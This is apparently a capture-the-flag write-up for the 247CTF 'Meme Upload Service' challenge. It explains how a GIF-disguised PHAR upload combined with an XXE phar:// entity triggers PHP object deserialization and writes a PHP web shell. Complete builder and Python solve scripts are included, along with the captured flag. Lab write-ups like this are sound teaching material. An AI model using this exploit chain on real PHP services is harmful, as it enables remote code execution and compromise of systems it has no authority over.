---
title: "MEME UPLOAD SERVICE"
date: 2026-02-17
summary: "247ctf hard web chall"
tags: ["247ctf", "ctf", "web", "xxe", "phar deserialization", "rce"]
---

<img src="/blog/247ctf_meme_upload_service_writeup/images/chall.png" width=600>

### Vulnerability Analysis

The challenge backend is pretty minimal. We are given two different types of uploads.  

Right off the bat, the backend has a `Message` class implementation, which hints at an object injection vuln somewhere. If we look at the `__destruct()` method, we can notice that if we control the `filepath` attribute, we get arbitrary file write.  

```php
class Message
{
    public function __construct($to, $from, $image)
    {
        $this->to = $to;
        $this->from = $from;
        $this->image = $image;
        $this->filePath = tempnam("/tmp/messages/", "") . ".txt"; // TODO: send messages
    }

    public function __destruct()
    {
        file_put_contents($this->filePath, sprintf(
            "Hey %s! Take a look at this meme: %s! - %s",
            $this->to,
            $this->from,
            $this->image,
        ));
    }
}
```

The first upload method allows us to upload an XML file, which the server will validate against the `valid_message.xsd` schema.  

Although this immediately hints at XXE, there are a couple issues. The first is that the server doesn't display the rendered XML output anywhere. The second is that our XML input is parsed with the `LIBXML_DTDLOAD` flag, so XML entities are loaded. This means that we even if we can't inject entities anywhere in our XML input, so we have no way of getting any visible leaks via XXE.  

```php
if (isset($_POST["message"])) {
    $msgXml = new DOMDocument();
    $msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
    if ($msgXml->schemaValidate("valid_message.xsd")) {
        $msgObj = new Message(
            $msgXml->getElementsByTagName("to")[0]->nodeValue,
            $msgXml->getElementsByTagName("from")[0]->nodeValue,
            $msgXml->getElementsByTagName("image")[0]->nodeValue
        );
        echo sprintf(
            "Message stored %s!",
            $msgObj->filePath
        );
    } else {
        echo "Invalid XML!";
    }
}
```

The backend also handles image uploads, but the checks are pretty strict as well. Although `mime_content_type()` can be easily bypassed with a fake file signature, the file extension is validated with `pathinfo()`, so we can't just directly upload a webshell. The upload size is also limited to `185` bytes, but this will only pose an issue later on.  

```php
else if (isset($_FILES["image"])) {
    $imageTmp = $_FILES["image"]["tmp_name"];
    $imageSize = $_FILES["image"]["size"];
    $imageExt = strtolower(pathinfo($_FILES["image"]["name"], PATHINFO_EXTENSION));
    $imageMime = mime_content_type($imageTmp);
    $allowedExt = array("jpg", "jpeg", "gif", "png");
    $allowedMime = array("image/jpeg", "image/gif", "image/png");
    if (in_array($imageExt, $allowedExt) === false)
        die("Invalid extension!");
    if (in_array($imageMime, $allowedMime) === false)
        die("Invalid mime type!");
    if (getimagesize($imageTmp) === false || $imageSize > 185)
        die("Invalid size!");
    $uploadPath = tempnam("/tmp/images/", "") . "." . $imageExt;
    move_uploaded_file($imageTmp, $uploadPath);
    echo sprintf(
        "Image uploaded %s!",
        $uploadPath
    );
} else {
    echo highlight_file(__FILE__, true);
}
```

Going back to the object injection theory from earlier, we can recall that it is possible to trigger object injection indirectly using the PHAR deserialization technique.  

If we analyse the upload logic, we will realise that it's actually possible to upload a malicious PHAR archive through the image upload, then use the XXE vuln in the XML upload to trigger PHAR deserialization using the `phar://` wrapper.  

We can craft a malicious `Message` object and inject it into the PHAR metadata, we can gain arbitrary file write and pivot to RCE.  

### Building the PHAR  

We can first generate a PHAR payload that will bypass the checks in the image upload. 

[This article](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#phar-deserialization) states that the stub is at the start of the PHAR archive, and at minimum, must end with `__HALT_COMPILER();`.  

We can inject a valid image signature at the start. Since `mime_content_type()` uses the `libmagic` database to identify signatures, to save ourselves some bytes, we can use the `GIF` header as it requires the fewest magic bytes for validation.  

PHAR archives require at least one file entry, so we can just create a dummy file entry named `a`. For the actual object injection, we inject a malicious `Message` object that will write an RCE payload to `a.php` in the same directory as the main page, making it accessible to us.  

We can write a script to generate the base PHAR payload for us.  

```php
class Message {
    public function __construct()
    {
        $this->to = "<?php system('ls')?>";
        $this->filePath = "a.php";
    }
}

$filename = 'payload.phar';

@unlink($filename);

$phar = new Phar($filename);
$phar->startBuffering();

$phar->setStub("GIF8__HALT_COMPILER();");
$phar->addFromString('a', '');

$object = new Message();
$phar->setMetadata($object);

$phar->stopBuffering();
```

### XXE  

To actually trigger the phar deserialization, we can define and call an XML entity that calls the `phar://` wrapper on our uploaded PHAR archive.  

Making a `POST` request to the server with our XML payload should in theory trigger the object injection and give us RCE.  

```xml
<!DOCTYPE message [
  <!ENTITY % xxe SYSTEM "phar://<path>/a">
  %xxe;
]>
<message>
  <to>a</to>
  <from>a</from>
  <image>a</image>
</message>
```

### Some Optimisations  

However, the next obstacle we need to overcome is the upload size limit. Right now, our payload currently sits at `200` bytes, which is way above the `185` byte limit.  

The biggest optimisation we can do is to change the signing algorithm of our archive. The default SHA256 algorithm produces a `32` byte signature, and changing it to `MD5` shaves off the byte count by half, giving us way more buffer for our RCE payload.    

```php
$phar->setSignatureAlgorithm(Phar::MD5);
```

Some additional small tweaks we can make is to shorten the filename, and also switch to shorthand tags in our RCE payload to allow for direct command execution.  

```php
class Message {
    public function __construct()
    {
        $this->to = "<?=`ls`?>";
        $this->filePath = ".php";
    }
}
```

### RCE  

Visiting `/.php` on the server will confirm that our RCE succeeded.  

<img src="/blog/247ctf_meme_upload_service_writeup/images/ls.png" width=600>

We can run `find / -name f*` to search the entire server for the flag file, which will reveal it being stored in `/tmp`.  

<img src="/blog/247ctf_meme_upload_service_writeup/images/find.png" width=600>

Since the file name is too long to fit under the byte count, we can just read it with `cat /tmp/fl*`.  

Below are my solve scripts for this chall.  

```php
<?php
    class Message {
        public function __construct()
        {
            $this->to = "<?=`cat /tmp/fl*`?>";
            $this->filePath = ".php";
        }
    }

    $filename = 'payload.phar';

    @unlink($filename);

    $phar = new Phar($filename);
    $phar->startBuffering();

    $phar->setStub("GIF8__HALT_COMPILER();");
    $phar->setSignatureAlgorithm(Phar::MD5);
    $phar->addFromString('a', '');

    $object = new Message();
    $phar->setMetadata($object);

    $phar->stopBuffering();
?>
```

```python
import requests
import subprocess
import re

url = "https://6b3ce533440b4734.247ctf.com/"

subprocess.run(['php', '-d', 'phar.readonly=0', 'exploit.php'])

# upload phar payload
with open('payload.phar', "rb") as f:
    res = requests.post(url, files={
        'image': ('payload.gif', f.read(), 'image/gif')
    })

    path = re.findall(r'uploaded (.+)!', res.text)[0].strip()

print("> PHAR uploaded:", path)

# xxe to phar deserialization
payload = f'''
<!DOCTYPE message [
  <!ENTITY % xxe SYSTEM "phar://{path}/a">
  %xxe;
]>
<message>
  <to>a</to>
  <from>a</from>
  <image>a</image>
</message>
'''.strip()

res = requests.post(url, data={
    'message': payload
})

print("> XXE triggered")

# rce
res = requests.get(f'{url}/.php')

flag = re.findall(r'(247CTF{.+})', res.text)[0]
print("Flag:", flag)
```

Flag: `247CTF{0073c38db2a4d3c1209caa84ccc5668f}`